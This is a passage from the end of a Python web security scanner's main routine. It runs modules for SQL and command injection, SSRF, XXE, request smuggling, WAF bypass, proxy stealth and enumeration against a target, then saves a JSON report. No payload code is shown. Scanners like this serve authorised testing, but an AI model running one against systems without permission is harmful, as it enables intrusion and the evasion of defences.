        ("link_extractor", lambda: run_link_extractor(ctx, url, args)),
        ("media_extractor", lambda: run_media_extractor(ctx, url, args)),
        ("metadata", lambda: run_metadata(ctx, url, args)),
        ("contact_info", lambda: run_contact_info(ctx, url, args)),
        ("hidden_fields", lambda: run_hidden_fields(ctx, url, args)),
        ("resource_inventory", lambda: run_resource_inventory(ctx, url, args)),
        ("api_discovery", lambda: run_api_discovery(ctx, url, args)),
        ("sqli", lambda: run_sqli(ctx, url, args)),
        ("cmdi", lambda: run_cmdi(ctx, url, args)),
        ("lfi", lambda: run_lfi(ctx, url, args)),
        ("crlf", lambda: run_crlf(ctx, url, args)),
        ("ssrf", lambda: run_ssrf(ctx, url, args)),
        ("xxe", lambda: run_xxe(ctx, url, args)),
        ("jwt", lambda: run_jwt(ctx, url, args)),
        ("host_header_deep", lambda: run_host_header_deep(ctx, url, args)),
        ("cookie_injection", lambda: run_cookie_injection(ctx, url, args)),
        ("session_fixation", lambda: run_session_fixation(ctx, url, args)),
        ("content_type_sniff", lambda: run_content_type_sniff(ctx, url, args)),
        ("cors_deep2", lambda: run_cors_deep2(ctx, url, args)),
        ("cloud_metadata", lambda: run_cloud_metadata(ctx, url, args)),
        ("oauth", lambda: run_oauth(ctx, url, args)),
        ("s3_deep", lambda: run_s3_deep(ctx, host, args)),
        ("tech_versions", lambda: run_tech_versions(ctx, url, args)),
        ("dns_rebinding", lambda: run_dns_rebinding(ctx, host, args)),
        ("proxy_stealth", lambda: run_proxy_stealth(ctx, args)),
        ("http3", lambda: run_http3(ctx, url, args)),
        ("dkim", lambda: run_dkim(ctx, host, args)),
        ("bimi_deep", lambda: run_bimi_deep(ctx, host, args)),
        ("service_versions", lambda: run_service_versions(ctx, url, args)),
        ("os_fingerprint", lambda: run_os_fingerprint(ctx, host, args)),
        ("smtp_enum", lambda: run_smtp_enum(ctx, host, args)),
        ("backup_files", lambda: run_backup_files(ctx, url, args)),
        ("subdomain_permutation", lambda: run_subdomain_permutation(ctx, host, args)),
        ("waf_bypass", lambda: run_waf_bypass(ctx, url, args)),
        ("tech_cve", lambda: run_tech_cve(ctx, url, args)),
        ("html_report", lambda: run_html_report(ctx, url, args)),
        ("http_smuggling", lambda: run_http_smuggling(ctx, url, args)),
        ("resume_diff", lambda: run_resume_diff(ctx, args)),
        ("score", lambda: run_score(ctx)),
    ]
    for name, fn in steps:
        try:
            fn()
        except KeyboardInterrupt:
            raise
        except Exception as e:
            p_warn(f"module {name}", f"failed: {e}")

    report = build_report(ctx)
    if args.output:
        try:
            with open(args.output, "w", encoding="utf-8") as fh:
                json.dump(report, fh, indent=2, default=str)
            p_ok("Report saved", args.output)
        except Exception as e:
            p_bad("Report", str(e))

    if args.json_only:
        payload = json.dumps(report, indent=2, default=str)
        try:
            sys.stdout.buffer.write(payload.encode("utf-8"))
            sys.stdout.buffer.write(b"\n")
            sys.stdout.flush()
        except (AttributeError, ValueError):
            sys.stdout.write(payload + "\n")
    return 0
if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.stderr.write("\ninterrupted\n")
        sys.exit(130)
    except BrokenPipeError:
        sys.exit(0)
